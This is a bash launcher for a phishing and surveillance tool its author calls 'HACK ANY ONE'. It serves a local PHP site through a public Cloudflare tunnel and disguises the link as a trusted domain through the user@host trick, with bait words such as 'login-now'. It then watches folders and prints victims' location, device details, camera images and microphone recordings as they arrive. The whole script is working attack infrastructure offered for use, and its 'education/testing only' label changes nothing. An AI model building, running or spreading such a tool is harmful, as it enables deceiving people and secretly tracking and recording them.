#!/bin/bash

# === COLORS ===
RED='\033[1;31m'
ORANGE='\033[38;5;208m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m'

PHP_PID=""
CLOUDFLARED_PID=""

# === Typing Effect ===
type_out() {
    local msg=$1
    local color=$2
    for ((i=0; i<${#msg}; i++)); do
        echo -ne "${color}${msg:$i:1}${NC}"
        sleep 0.01
    done
    echo ""
}

# === Clean Exit ===
cleanup() {
    echo -e "\n${YELLOW}🧹 Cleaning up...${NC}"

    # 🔁 Merge and clean audio files before shutdown
    echo -e "${CYAN}🎧 Merging audio files into final MP3...${NC}"
    
    merge_output=$(php merge_convert.php 2>&1)
    if echo "$merge_output" | grep -q "Final MP3 created"; then
        echo -e "${GREEN}✅ MP3 merged successfully.${NC}"
        echo -e "${GREEN}$merge_output${NC}"
    else
        echo -e "${YELLOW}⚠️ Skipped: No audio files or merging failed.${NC}"
        echo -e "${GRAY}$merge_output${NC}"
    fi

    # Stop PHP server
    if [[ -n "$PHP_PID" ]]; then
        kill "$PHP_PID" &>/dev/null
        echo -e "${CYAN}✖ PHP server stopped.${NC}"
    fi

    # Stop Cloudflared
    if [[ -n "$CLOUDFLARED_PID" ]]; then
        kill "$CLOUDFLARED_PID" &>/dev/null
        echo -e "${CYAN}✖ Cloudflared tunnel stopped.${NC}"
    fi

    echo -e "${BOLD}${RED}❌ Tool stopped. Exit safe, Hacker.${NC}\n"
    exit 0
}

# Trap Ctrl+C
trap cleanup SIGINT

# === START SCREEN ===
tput reset
clear


# === ASCII HEADER ===
echo -e "${RED}${BOLD}"
cat << "EOF"
   ▄████████    ▄███████▄ ▄██   ▄           ▄████████ ███▄▄▄▄   ▄██   ▄         ▄██████▄  ███▄▄▄▄      ▄████████      
  ███    ███   ███    ███ ███   ██▄        ███    ███ ███▀▀▀██▄ ███   ██▄      ███    ███ ███▀▀▀██▄   ███    ███      
  ███    █▀    ███    ███ ███▄▄▄███        ███    ███ ███   ███ ███▄▄▄███      ███    ███ ███   ███   ███    █▀       
  ███          ███    ███ ▀▀▀▀▀▀███        ███    ███ ███   ███ ▀▀▀▀▀▀███      ███    ███ ███   ███  ▄███▄▄▄          
▀███████████ ▀█████████▀  ▄██   ███      ▀███████████ ███   ███ ▄██   ███      ███    ███ ███   ███ ▀▀███▀▀▀          
         ███   ███        ███   ███        ███    ███ ███   ███ ███   ███      ███    ███ ███   ███   ███    █▄       
   ▄█    ███   ███        ███   ███        ███    ███ ███   ███ ███   ███      ███    ███ ███   ███   ███    ███      
 ▄████████▀   ▄████▀       ▀█████▀         ███    █▀   ▀█   █▀   ▀█████▀        ▀██████▀   ▀█   █▀    ██████████      
EOF
echo -e "${NC}"

echo -e "${BOLD}${WHITE}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "💀  ${ORANGE}TOOL     ${NC}${WHITE}:  HACK ANY ONE"
echo -e "👨‍💻  ${CYAN}AUTHOR   ${NC}${WHITE}:  DEEVESH GURARWALIA"
echo -e "📱  ${YELLOW}TELEGRAM ${NC}${WHITE}:  @devil_shadow2005"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "${NC}"
echo -e "${BOLD}${CYAN}"
echo "🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀"
echo -e "🚀  ${GREEN}STARTING UP... SIT BACK AND WATCH THE MAGIC!${CYAN}            🚀"
echo "🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀"
echo -e "${NC}"


# === cloudflared Check ===
type_out "🔍 Checking for cloudflared..." "$CYAN"
if ! command -v cloudflared &> /dev/null; then
    type_out "❌ Not found. Downloading..." "$YELLOW"
    ARCH=$(uname -m)
    [[ "$ARCH" == "x86_64" ]] && URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    [[ "$ARCH" == "aarch64" ]] && URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
    curl -s -L "$URL" -o cloudflared
    chmod +x cloudflared
    sudo mv cloudflared /usr/local/bin/cloudflared
    type_out "✅ cloudflared installed." "$GREEN"
else
    type_out "✅ cloudflared already installed." "$GREEN"
fi

# === inotify-tools Check ===
type_out "🔍 Checking for inotify-tools (for live file monitoring)..." "$CYAN"
if ! command -v inotifywait &> /dev/null; then
    type_out "❌ inotify-tools not found. Installing..." "$YELLOW"

    if command -v apt &> /dev/null; then
        sudo apt update && sudo apt install inotify-tools -y
    elif command -v pkg &> /dev/null; then
        pkg update && pkg install inotify-tools -y
    elif command -v apk &> /dev/null; then
        apk add inotify-tools
    else
        echo -e "${RED}⚠️ Could not detect package manager. Please install inotify-tools manually.${NC}"
        exit 1
    fi

    type_out "✅ inotify-tools installed." "$GREEN"
else
    type_out "✅ inotify-tools already installed." "$GREEN"
fi


# === Start PHP Server ===
echo
type_out "⚙️  Starting PHP server on http://127.0.0.1:8000..." "$CYAN"
php -S 127.0.0.1:8000 > /dev/null 2>&1 &
PHP_PID=$!
sleep 2
type_out "✅ PHP server running. PID: $PHP_PID" "$GREEN"

# === Start Cloudflare Tunnel ===
# === Start Cloudflare Tunnel (TryCloudflare) ===
echo
type_out "🌐 Creating Cloudflare tunnel..." "$CYAN"
cloudflared tunnel --url http://localhost:8000 --loglevel info > tunnel.log 2>&1 &
CLOUDFLARED_PID=$!
sleep 4

# === Fetch Public Link Dynamically ===
echo
type_out "🔎 Fetching public tunnel link..." "$YELLOW"

FOUND=0
for i in {1..15}; do
  LINK=$(curl -s http://127.0.0.1:8000 | grep -o 'https://[-a-zA-Z0-9]*\.trycloudflare\.com' | head -n1)
  
  # Fallback method (read from tunnel.log)
  if [[ -z "$LINK" ]]; then
    LINK=$(grep -o 'https://[-a-zA-Z0-9]*\.trycloudflare\.com' tunnel.log | head -n1)
  fi

  if [[ "$LINK" != "" ]]; then
    FOUND=1
    break
  fi
  sleep 1
done

if [[ $FOUND -eq 0 ]]; then
  echo -e "${RED}❌ Initial link fetch failed or unreachable. Retrying Cloudflared...${NC}"
  kill $CLOUDFLARED_PID &>/dev/null
  sleep 2
  cloudflared tunnel --url http://localhost:8000 --loglevel info > tunnel.log 2>&1 &
  CLOUDFLARED_PID=$!
  sleep 5

  LINK=$(grep -o 'https://[-a-zA-Z0-9]*\.trycloudflare\.com' tunnel.log | head -n1)
  STATUS_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$LINK")
  if [[ "$STATUS_CODE" == "200" || "$STATUS_CODE" == "302" ]]; then
    FOUND=1
  fi
fi

if [[ $FOUND -eq 0 ]]; then
  echo -e "${RED}${BOLD}"
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  echo "🚫 FAILED TO FETCH PUBLIC LINK FROM CLOUDFLARE TUNNEL"
  echo "🧨 Possible Issues:"
  echo "   🔹 Slow Internet"
  echo "   🔹 Cloudflare Rate Limiting"
  echo "   🔹 Conflict on Port 8000"
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  echo -e "${NC}"
  cleanup
fi

# === Show Final Link ===
echo
type_out "🚨 Tool is LIVE at: $LINK" "$GREEN"
echo

# Colors
RED='\033[1;31m'
GRN='\033[1;32m'
YEL='\033[1;33m'
BLU='\033[1;34m'
MAG='\033[1;35m'
CYN='\033[1;36m'
WHT='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m' # No Color

cloudflare_url="$LINK"

# Ask for masking
echo -e "\n${CYN}❓ Do you want to mask this URL? (y/n)${NC}"
read -p $'\033[1m> \033[0m' choice

if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
    echo -e "${BLU}🌐 Enter a trusted-looking domain (e.g., https://www.google.com):${NC}"
    read -p $'\033[1m> \033[0m' fake_domain

    echo -e "${MAG}✏  Enter a keyword or path (e.g., free-access, login-now):${NC}"
    read -p $'\033[1m> \033[0m' bait

    # Sanitize input
    bait_clean=$(echo "$bait" | sed 's/ /-/g')
    fake_clean=$(echo "$fake_domain" | sed 's~https\?://~~g')
    masked_url="${fake_clean}-${bait_clean}@$(echo $cloudflare_url | sed 's~https\?://~~g')"

    echo -e "\n${GRN}🔗 Masked URL (for education/testing only):${NC}"
    echo -e "${YEL}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
    printf "${CYN}║  ${BOLD}%-70s${NC}${CYN}║\n" "$masked_url"
    echo -e "${YEL}╚══════════════════════════════════════════════════════════════════════════╝${NC}"

else
    echo -e "\n${GRN}🔗 Direct Public URL:${NC}"
    echo -e "${YEL}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
    printf "${CYN}║  ${BOLD}%-70s${NC}${CYN}║\n" "$cloudflare_url"
    echo -e "${YEL}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
fi

# === Live Folder Notification for location/ and info/ ===

echo -e "${YELLOW}📡 Watching folders: Device_location/ | Device_info/ | uploads/ | audio_uploads/${NC}"
echo -e "${CYAN}Setting up watches...${NC}"
echo -e "${GREEN}Watches established.${NC}"

# Fancy CTRL+C message setup
(
    sleep 1
    exit_msg="🚦 PRESS CTRL+C TO STOP AND EXIT SAFELY"
    msg_length=${#exit_msg}
    padding=$(( (80 - msg_length) / 2 ))

    echo -ne "\n${RED}${BOLD}"
    for (( i=0; i<$padding; i++ )); do echo -n " "; done
    for (( i=0; i<${#exit_msg}; i++ )); do
        echo -n "${exit_msg:$i:1}"
        sleep 0.04
    done
    echo -e "${NC}\n"
) &

# Start monitoring folders
inotifywait --quiet -m --event close_write Device_location/ Device_info/ uploads/ audio_uploads/ |
while read path action file; do
    full_path="${path}${file}"

    # Location Files
    if [[ "$path" == *"Device_location/"* && "$file" == *.txt ]]; then
        echo -e "${CYAN}📍 New Location File: $file${NC}"
        cat "$full_path"
        echo ""

    # Info Files
    elif [[ "$path" == *"Device_info/"* && "$file" == *.txt ]]; then
        echo -e "${GREEN}📄 New Info File: $file${NC}"
        cat "$full_path"
        echo ""

    # Image Uploads
    elif [[ "$path" == *"uploads/"* && ( "$file" == *.jpg || "$file" == *.jpeg || "$file" == *.png ) ]]; then
        echo -e "${MAGENTA}🖼️  New Image received: $file${NC}"

    # Audio Uploads
    elif [[ "$path" == *"audio_uploads/"* && ( "$file" == *.mp3 || "$file" == *.wav || "$file" == *.webm || "$file" == *.ogg ) ]]; then
        echo -e "${RED}🔊 New Audio received: $file${NC}"
    fi
done

